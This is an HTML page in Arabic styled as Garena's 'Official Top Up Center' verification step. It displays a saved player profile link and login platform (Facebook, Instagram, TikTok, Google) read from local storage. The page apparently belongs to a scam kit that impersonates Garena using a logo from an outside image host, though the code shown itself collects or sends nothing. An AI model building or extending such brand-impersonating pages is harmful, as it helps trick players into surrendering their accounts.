<!DOCTYPE html>
<html lang="en" dir="rtl" class="notranslate" translate="no"> 
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="google" content="notranslate">
    <title>Garena - Professional Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    
    <style>
        :root { 
            --bg-body: #f4f7fa; 
            --card-bg: #ffffff;
            --border-gray: #e2e8f0; 
            --text-main: #0f172a;
            --text-muted: #64748b;
            --primary-blue: #2563eb;
        }

        body { 
            margin: 0; padding: 0; 
            font-family: 'Inter', sans-serif; 
            background-color: var(--bg-body); 
            display: flex; justify-content: center; 
        }

        .mobile-container { 
            width: 100%; max-width: 480px; 
            min-height: 100vh; background-color: var(--bg-body);
            display: flex; flex-direction: column; 
        }

        /* --- Header --- */
        header { 
            width: 100%; height: 65px; background-color: #fff; 
            border-bottom: 1px solid var(--border-gray); display: flex; 
            align-items: center; justify-content: space-between; 
            padding: 0 16px; box-sizing: border-box; position: sticky; 
            top: 0; z-index: 1000;
        }

        .brand-section { display: flex; align-items: center; }
        .logo-img { height: 26px; width: auto; }
        .v-line { width: 1px; height: 20px; background-color: #cbd5e0; margin: 0 12px; }
        .title-box { display: flex; flex-direction: column; text-align: right; }
        .title-box span { font-size: 10px; font-weight: 800; color: var(--text-main); line-height: 1.1; }

        /* --- Order Section --- */
        .order-section { padding: 20px 16px; animation: fadeInUp 0.5s ease-out; }
        
        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(15px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .order-card {
            background: var(--card-bg);
            border-radius: 20px;
            padding: 24px;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.05);
            border: 1px solid #fff;
        }

        .card-header { margin-bottom: 24px; text-align: center; }
        .card-header h2 { font-size: 18px; font-weight: 800; color: var(--text-main); margin: 0; }

        /* استايل عرض البيانات المطور */
        .data-item {
            background: #f8fafc;
            border: 1.5px solid #f1f5f9;
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 16px;
        }

        .item-label {
            font-size: 11px;
            font-weight: 700;
            color: var(--primary-blue);
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .item-value {
            font-size: 14px;
            font-weight: 700;
            color: var(--text-main);
            word-break: break-all;
            display: flex;
            align-items: center;
            gap: 10px; /* مسافة بين الأيقونة والنص */
        }

        /* حجم أيقونة المنصة */
        .platform-icon-box {
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .platform-icon-box svg {
            width: 100%;
            height: 100%;
        }

        .platform-badge {
            background: #dbeafe;
            color: var(--primary-blue);
            padding: 4px 10px;
            border-radius: 8px;
            font-size: 11px;
            margin-right: auto;
        }
    </style>
</head>
<body>
    <div class="mobile-container">
        <header>
            <div class="brand-section">
                <img src="https://i.postimg.cc/KvMWmkZw/servio.png" alt="Garena" class="logo-img">
                <div class="v-line"></div>
                <div class="title-box">
                    <span id="nav-t1">Official Top Up</span>
                    <span id="nav-t2">Center</span>
                </div>
            </div>
        </header>

        <div class="order-section">
            <div class="order-card">
                <div class="card-header">
                    <h2 id="order-title">مراجعة الطلب</h2>
                </div>

                <div class="data-item">
                    <div class="item-label">رابط الملف الشخصي</div>
                    <div class="item-value">
                        <span id="platform-link-val">---</span>
                    </div>
                </div>

                <div class="data-item">
                    <div class="item-label">منصة تسجيل الدخول</div>
                    <div class="item-value">
                        <div id="platform-icon-display" class="platform-icon-box">
                            </div>
                        <span id="platform-name-val">جاري التعرف...</span>
                        <span class="platform-badge">نشط</span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // تعريف الأيقونات الأربعة
        const platformIcons = {
            facebook: `<svg viewBox="0 0 24 24" fill="#1877F2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>`,
            instagram: `<svg viewBox="0 0 24 24" fill="#E4405F"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069z"/></svg>`,
            tiktok: `<svg viewBox="0 0 24 24" fill="#000000"><path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.06-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.9-.32-1.9-.23-2.74.12-.69.29-1.27.87-1.62 1.54-.34.66-.46 1.43-.37 2.16.14 1.23.86 2.36 1.94 2.96.9.52 2 .61 3 .29.9-.25 1.69-.93 2.1-1.77.34-.65.48-1.4.47-2.14-.02-3.95-.01-7.9-.02-11.85z"/></svg>`,
            google: `<svg viewBox="0 0 24 24" fill="#4285F4"><path d="M12.48 10.92v3.28h7.84c-.24 1.84-.9 3.32-2.11 4.52-1.12 1.12-2.88 2.32-5.73 2.32-4.48 0-8.08-3.6-8.08-8.08s3.6-8.08 8.08-8.08c2.44 0 4.28.96 5.6 2.24l2.32-2.32C18.48 2.76 15.72 1.2 12.48 1.2 6.44 1.2 1.56 6.08 1.56 12s4.88 10.8 10.92 10.8c3.24 0 5.68-1.08 7.6-3.08 1.96-1.96 2.56-4.76 2.56-6.96 0-.72-.08-1.4-.2-1.92h-9.96z"/></svg>`
        };

        function updateUI() {
            // جلب البيانات المخزنة
            const savedLink = localStorage.getItem('saved_player_link') || '---';
            const savedPlatform = localStorage.getItem('saved_platform_name') || 'غير معروف';

            // عرض النصوص
            document.getElementById('platform-link-val').innerText = savedLink;
            document.getElementById('platform-name-val').innerText = savedPlatform;

            // منطق تغيير الأيقونة
            const iconDisplay = document.getElementById('platform-icon-display');
            const platformKey = savedPlatform.toLowerCase();

            if (platformKey.includes('facebook')) {
                iconDisplay.innerHTML = platformIcons.facebook;
            } else if (platformKey.includes('instagram')) {
                iconDisplay.innerHTML = platformIcons.instagram;
            } else if (platformKey.includes('tiktok')) {
                iconDisplay.innerHTML = platformIcons.tiktok;
            } else if (platformKey.includes('google')) {
                iconDisplay.innerHTML = platformIcons.google;
            } else {
                // أيقونة افتراضية في حال لم يطابق شيء
                iconDisplay.innerHTML = `<svg viewBox="0 0 24 24" fill="#64748b"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08s5.97 1.09 6 3.08c-1.29 1.94-3.5 3.22-6 3.22z"/></svg>`;
            }
        }

        document.addEventListener('DOMContentLoaded', updateUI);
    </script>
</body>
</html>
